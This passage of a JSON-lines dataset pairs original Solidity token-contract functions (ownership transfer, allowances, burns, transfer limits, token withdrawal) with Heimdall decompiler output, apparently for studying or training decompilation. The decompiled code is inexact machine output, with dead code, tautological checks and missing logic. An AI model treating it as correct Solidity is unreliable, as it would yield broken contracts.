0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xe5D4968bE9C41A41eB6b6eE324484A1e44Ce0FE2", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2046683F5caE663A8e83069e77c3F20a8B26B876", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x172F7a6F8C76321376cf077c4b68f6C0A0907d2f", "original_solidity_code": "function manualBurn(uint256 amount) external onlyOwner returns (bool) {\r\n        return _basicTransfer(address(this), DEAD, amount);\r\n    }", "heimdall_decompiled_code": "function manualBurn(uint256 arg0) public returns (bool) {\n        require(arg0 == arg0);\n        require(address(msg.sender) == (address(getOwner / 0x01)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x06;\n        var_e = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        uint256 var_c = 0x40 + var_c;\n        var_a = 0x14;\n        var_f = 0x496e73756666696369656e742042616c616e6365000000000000000000000000;\n        address var_g = address(this);\n        var_h = 0x06;\n        require(!(arg0 > storage_map_k[var_g]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        uint256 var_j = var_c.length;\n        require(!(0 > var_c.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_k = 0;\n        var_l = var_m;\n        require(!(0x20 > var_c.length), \"Insufficient Balance\");\n        var_k = 0;\n        require(!(storage_map_k[var_g] < arg0), \"SafeMath: addition overflow\");\n        var_g = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_n = 0x11;\n        var_g = address(this);\n        var_h = 0x06;\n        storage_map_k[var_g] = storage_map_k[var_g] - arg0;\n        var_g = address(store_l / 0x01);\n        var_h = 0x06;\n        require(!(storage_map_k[var_g] > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - arg0)), \"SafeMath: addition overflow\");\n        var_g = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_n = 0x11;\n        require(!((storage_map_k[var_g] + arg0) < storage_map_k[var_g]), \"SafeMath: addition overflow\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_j = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_g = address(store_l / 0x01);\n        var_h = 0x06;\n        storage_map_k[var_g] = storage_map_k[var_g] + arg0;\n        uint256 var_i = arg0;\n        emit Transfer(address(this), address(store_l / 0x01), arg0);\n        var_i = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x4103F78C623459b3e985dE5F5d78622944B9dE6D", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"TOKEN: Max Transaction Limit\");\n        require(address(arg0), \"TOKEN: Max Transaction Limit\");\n        require(arg1 > 0, \"TOKEN: Max Transaction Limit\");\n        require(address(owner) == (address(msg.sender)), \"TOKEN: Max Transaction Limit\");\n        require(!(!(address(owner)) == (address(arg0))), \"TOKEN: Max Transaction Limit\");\n        require(bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000), \"TOKEN: Max Transaction Limit\");\n        require(!(arg1 > _maxTxAmount), \"TOKEN: Max Transaction Limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000;\n        address var_e = address(msg.sender);\n        var_f = 0x10;\n        require(!(!bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        require(!(bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c697374;\n        var_g = 0x6564210000000000000000000000000000000000000000000000000000000000;\n        require(address(uniswapV2Pair) == (address(arg0)), \"Amount must be less than total reflections\");\n        var_e = address(arg0);\n        var_f = 0x02;\n        require(!(storage_map_c[var_e] > store_m), \"Amount must be less than total reflections\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_a = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x5af3107a4000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x5af3107a4000) {\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x5af3107a4000, \"TOKEN: This account cannot send tokens until trading is enabled\");\n        }\n        require(address(owner) == (address(msg.sender)), \"TOKEN: This account cannot send tokens until trading is enabled\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x3f;\n        var_d = 0x544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e6420;\n        var_g = 0x746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400;\n        var_e = address(msg.sender);\n        var_f = 0x05;\n        if (storage_map_c[var_e]) {\n            if (storage_map_c[var_e]) {\n                if (!storage_map_c[var_e]) {\n                    if (0) {\n                        if (store_n) {\n                            if (store_n) {\n                            }\n                        }\n                        if (!(address(uniswapV2Pair)) == (address(msg.sender))) {\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(!(bytes1(storage_map_c[var_e])), \"Transfer amount must be greater than zero\");\n                            require(0, \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                        }\n                    }\n                    require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n                }\n                require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n            }\n            require(0x01, \"Transfer amount must be greater than zero\");\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x29;\n        var_d = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x25;\n        var_d = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x73adcB9F7B46BF6E6f1D027BB13eAAfa158A8A09", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x99D795eEDe17E3400f1Dd664fc1578CD93df464f", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x05f5e100) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if (0x0a) {\n                        if (0x0a == 0x01) {\n                            if (0x0a == 0x02) {\n                                if (!0x09 > 0xff) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                        if (!0x09 > 0x01) {\n                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_f = 0x11;\n                                                    if (!0x01) {\n                                                    }\n                                                    if (0x0a) {\n                                                        if (0x0a == 0x01) {\n                                                            if (0x0a == 0x02) {\n                                                                if (!0x09 > 0xff) {\n                                                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_f = 0x11;\n                                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function setMaxTxnAmount(uint256 newNum) external onlyOwner {\r\n        require(\r\n            newNum >= ((totalSupply() * 5) / 1000) / 1e18,\r\n            \"Cannot change maxTransactionAmount lower than 0.2%\"\r\n        );\r\n        maxTransactionAmount = newNum * (10**18);\r\n    }", "heimdall_decompiled_code": "function setMaxTxnAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x05) / 0x05)) | !0x05);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x332098414098f0E42658f2eA0254B44b077bb4A5", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        _owner = (address(arg0) * 0x01) | (uint96(_owner));\n        emit OwnershipTransferred(address(_owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x45c86eBa585dfA8C43E636EBd025C99E972aB464", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"SafeMath: multiplication overflow\");\n        require(address(arg0) - 0, \"SafeMath: multiplication overflow\");\n        require(arg1 > 0, \"SafeMath: multiplication overflow\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"SafeMath: multiplication overflow\");\n        require(store_b > store_c, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_d == ((arg1 * store_d) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_d) / arg1) == store_d, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_f / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        address var_a = address(tx.origin);\n        var_n = 0x05;\n        require(storage_map_h[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x49;\n        var_l = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_n = 0x05;\n        storage_map_h[var_a] = block.number;\n        require(!(address(msg.sender)) == (address(store_g / 0x01)));\n        require(!(address(msg.sender)) == (address(store_g / 0x01)));\n        require(!(address(msg.sender)) == (address(store_g / 0x01)));\n        require(!(address(arg0)) == (address(store_g / 0x01)));\n        require(!(address(arg0)) == (address(store_g / 0x01)));\n        var_a = address(this);\n        var_n = 0x01;\n        require(bytes1(store_i));\n        require(bytes1(store_i) - ((store_i / 0x02) < 0x20));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x22;\n        var_e = var_e + (0x20 + (((0x1f + (store_i / 0x02)) / 0x20) * 0x20));\n        uint256 var_j = store_i / 0x02;\n        require(bytes1(store_i));\n        require(bytes1(store_i) - ((store_i / 0x02) < 0x20));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x22;\n        require(!store_i / 0x02);\n        require(0x1f < (store_i / 0x02));\n        var_a = 0x06;\n        address var_q = storage_map_h[var_a];\n        require((0x20 + var_e) + (store_i / 0x02) > (0x20 + (0x20 + var_e)));\n        require(!(((0x20 + var_e) + var_e.length) - (0x20 + var_e)) < 0x20);\n        require(var_r == (address(var_r)));\n        var_q = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_h = address(msg.sender);\n        (bool success, bytes memory ret0) = address(var_r).Unresolved_70a08231(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_s == (var_s));\n        require(var_s - 0, \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_g / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_d) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_n = 0x01;\n        require(!(storage_map_h[var_a] > (storage_map_h[var_a] + ((arg1 * store_d) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(storage_map_h[var_a] + ((arg1 * store_d) / 0x64) < storage_map_h[var_a]), \"SafeMath: addition overflow\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_o = 0x1b;\n        var_p = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] + ((arg1 * store_d) / 0x64);\n        uint256 var_t = (arg1 * store_d) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_d) / 0x64);\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        var_e = 0x40 + var_e;\n        var_t = 0x1e;\n        var_u = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(0 > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_h[var_a] - 0) > storage_map_h[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(msg.sender);\n        var_n = 0x01;\n        storage_map_h[var_a] = storage_map_h[var_a] - 0;\n        var_e = 0x40 + var_e;\n        var_v = 0x1e;\n        var_w = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_d) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_x = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_y = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_z = var_e.length;\n        address var_aa = 0;\n        address var_ab = var_m;\n        var_aa = 0;\n        if (!(arg1 - ((arg1 * store_d) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            if (storage_map_h[var_a] > _maxTaxSwap) {\n            }\n            if (!store_b > store_k) {\n            }\n            if (!storage_map_h[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_g / 0x0100000000000000000000000000000000000000000000) {\n            }\n            require(!(arg1 - ((arg1 * store_d) / 0x64)) > arg1);\n        }\n        if (store_b > store_m) {\n            if (arg1 - 0) {\n            }\n            if (arg1 - 0) {\n            }\n            require(store_b > store_m, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_h = 0x19;\n        var_l = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_f / 0x01))) {\n            if (address(arg0) == (address(store_f / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x780c7f2FdF0D47F25f5858975DBd0159DB50C1B2", "original_solidity_code": "function ChippedRefineResourceIndicators(uint256 newAmount)\\r\\n        external\\r\\n        onlyOwner\\r\\n        returns (bool)\\r\\n    {\\r\\n        require(\\r\\n            newAmount >= (totalSupply() * 1) / 100000,\\r\\n            \\\"Swap amount cannot be lower than 0.001% total supply.\\\"\\r\\n        );\\r\\n        require(\\r\\n            newAmount <= (totalSupply() * 5) / 1000,\\r\\n            \\\"Swap amount cannot be higher than 0.5% total supply.\\\"\\r\\n        );\\r\\n        swapTokensAmount = newAmount;\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function ChippedRefineResourceIndicators(uint256 arg0) public view {\n        require(arg0 == arg0);\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!totalSupply | (0x01 == ((totalSupply * 0x01) / totalSupply)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x0186a0, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        require(!(arg0 < ((totalSupply * 0x01) / 0x0186a0)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x35;\n        var_e = 0x5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e;\n        var_h = 0x20302e3030312520746f74616c20737570706c792e0000000000000000000000;\n    }"}
{"contract_address": "0x5B8BA3cb21F36a06b3a86774103F8dBDa14483EC", "original_solidity_code": "function withdrawStuckTokens(uint256 amount) external onlyOwner {\r\n        require(paymentToken.balanceOf(address(this)) >= amount, \"Insufficient token balance\");\r\n        paymentToken.transfer(owner(), amount);\r\n    }", "heimdall_decompiled_code": "function withdrawStuckTokens(uint256 arg0) public payable {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_b = address(this);\n        (bool success, bytes memory ret0) = address(0xfb6b23ade938ed16f769833b2ff92ca26303390b).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (var_f));\n        require(!(var_f < arg0), \"Insufficient token balance\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_e = 0x1a;\n        var_h = 0x496e73756666696369656e7420746f6b656e2062616c616e6365000000000000;\n        var_g = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        var_d = address(owner / 0x01);\n        uint256 var_e = arg0;\n        (bool success, bytes memory ret0) = 